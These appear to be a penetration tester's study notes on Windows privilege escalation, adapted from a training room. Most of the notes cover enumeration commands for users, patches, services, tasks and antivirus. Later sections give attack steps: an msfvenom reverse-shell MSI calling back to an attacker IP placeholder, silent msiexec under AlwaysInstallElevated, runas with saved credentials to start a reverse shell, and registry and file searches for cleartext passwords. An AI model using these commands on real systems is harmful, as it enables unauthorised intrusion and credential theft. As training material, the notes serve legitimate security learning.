#/enumerate/windows/maunal

search: [links](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

#/enumerate/windows/scripts

If the antivirus software allows it, run an automated enumeration script such as `winPEAS` or `PowerUp.ps1`


#/enumerate/windows/users 
 
 Current user’s privileges: `whoami /priv`

List users: `net users`

List details of a user: `net user username` (e.g. `net user Administrator`)
tag:#/enumerate/windows/searchingfiles
Other users logged in simultaneously: `qwinsta` (the `query session` command can be used the same way) 

User groups defined on the system: `net localgroup`

List members of a specific group: `net localgroup groupname` (e.g. `net localgroup Administrators`)

#/enumerate/windows/systemInformation

`systeminfo`
command will return an overview of the target system. On some targets, the amount of data returned by this command can be overwhelming, so you can always grep the output as seen below:

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

`hostname`

#/enumerate/windows/searchingfiles ^3f1104

`findstr`

`findstr /si password *.txt`

command breakdown:
`findstr`: Searches for patterns of text in files.

`/si`: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)

`password`: The command will search for the string “password” in files

`*.txt`: The search will cover files that have a .txt extension

[[Unquoted Service Path#^1d274a]]


#/enumerate/windows/Patchlevel

Microsoft regularly releases updates and patches for Windows systems. A missing critical patch on the target system can be an easily exploitable ticket to privilege escalation. The command below can be used to list updates installed on the target system.

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

`wmic qfe where "HotfixID = 'KB973687'"`

#/enumerate/windows/NetworkConnections

`netstat -ano`

The command above can be broken down as follows;

-   `-a`: Displays all active connections and listening ports on the target system.
-   `-n`: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
-   `-o`: Displays the process ID using each listed connection.

Any port listed as “LISTENING” that was not discovered with the external port scan can present a potential local service.

  If you uncover such a service, you can try port forwarding to connect and potentially exploit it. The port forwarding process will allow tunnelling your connection over the target system, allowing you to access ports and services that are unreachable from outside the target system. We will not cover port forwarding as it is beyond the scope of this room.
  
  #/enumerate/windows/ScheduledTasks
  
  Some tasks may be scheduled to run at predefined times. If they run with a privileged account (e.g. the System Administrator account) and the executable they run can be modified by the current user you have, an easy path for privilege escalation can be available.

  The `schtasks` command can be used to query scheduled tasks.

`schtasks /query /fo LIST /v`

#/enumerate/windows/Drivers

Drivers are additional software installed to allow the operating system to interact with an external device. Printers, web cameras, keyboards, and even USB memory sticks can need drivers to run. While operating system updates are usually made relatively regularly, drivers may not be updated as frequently. Listing available drivers on the target system can also present a privilege escalation vector. The `driverquery` command will list drivers installed on the target system. You will need to do some online research about the drivers listed and see if any presents a potential privilege escalation vulnerability.


#/enumerate/windows/Antivirus

  Typically, you can take two approaches: looking for the antivirus specifically or listing all running services and checking which ones may belong to antivirus software.

  The first approach may require some research beforehand to learn more about service names used by the antivirus software. For example, the default antivirus installed on Windows systems, Windows Defender’s service name is windefend. The query below will search for a service named “windefend” and return its current state.

             sc query windefend`

 While the second approach will allow you to detect antivirus software without prior knowledge about its service name, the output may be overwhelming.

          `sc queryex type=service`
		  

#/enumerate/windows/tools

WinPEAS can be downloaded [link](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

`PowerUp` is a PowerShell script that searches common privilege escalation on the target system. You can run it with the `Invoke-AllChecks` option that will perform all possible checks on the target system or use it to conduct specific checks (e.g. the `Get-UnquotedService` option to only look for potential unquoted service path vulnerabilities).

PowerUp can be downloaded [link](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

  Once this is done, windows-exploit-suggester.py can be run as follows;

`windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt`

  A newer version of Windows Exploit Suggester is available [here](https://github.com/bitsadmin/wesng). Depending on the version of the target system, using the newer version could be more efficient.

**Metasploit**  

If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

#/enumerate/windows/VulnerableSoftware

You can use the `wmic` tool seen previously to list software installed on the target system and its versions. The command below will dump information it can gather on installed software.  
`wmic product`

`wmic product get name,version,vendor`

`wmic service list brief`

As the output of this command can be overwhelming, you can grep the output for running services by adding a `findstr` command as shown below.

`wmic service list brief | findstr  "Running"`

If you need more information on any service, you can simply use the `sc qc` command as seen below.

```shell-session
C:\Users\user>sc qc RemoteMouseService
```
 ## Listing the running services
```
 wmic service get name,displayname,pathname,startmode
 
```
[[DLL_Hijacking]]
[[Token Impersonation#^920cdc]]

## Scheduled Tasks

```
schtasks

```

#/windows/exploit/AlwaysInstallElevated

**AlwaysInstallElevated**  
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges if the installation requires administrator privileges.  
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

  
This method requires two registry values to be set. You can query these from the command line using the commands below.  
  
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

```  
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

```
  
Remember, to be able to exploit this vulnerability, **both should be set**. Otherwise, exploitation will not be possible.  
If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below.  
  
``` 
msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

```
  
As this is a reverse shell, you should also run the **Metasploit Handler** module configured accordingly.

Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell.

Command Run on the Target System

  C:\Users\user\Desktop> 
  ``` 
  msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi 
  
  ```
  
  #/windows/exploit/cleartext_passwords
  
  **Passwords**  
We have seen earlier that looking for configuration or user-generated files containing cleartext passwords can be rewarding. There are other locations on Windows that could hide cleartext passwords.  
  
**Saved credentials:** Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials.  
 ```
 cmdkey /list 
 
 ```  

If you see any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.  
 ```
 runas /savecred /user:admin reverse_shell.exe 
 ```  
  
**Registry keys:** Registry keys potentially containing passwords can be queried using the commands below.  
 ``` reg query HKLM /f password /t REG_SZ /s  ```  
 ``` reg query HKCU /f password /t REG_SZ /s ```  
  
**Unattend files:** Unattend.xml files helps system administrators setting up Windows systems. They need to be deleted once the setup is complete but can sometimes be forgotten on the system. What you will find in the unattend.xml file can be different according to the setup that was done. If you can find them on a system, they are worth reading.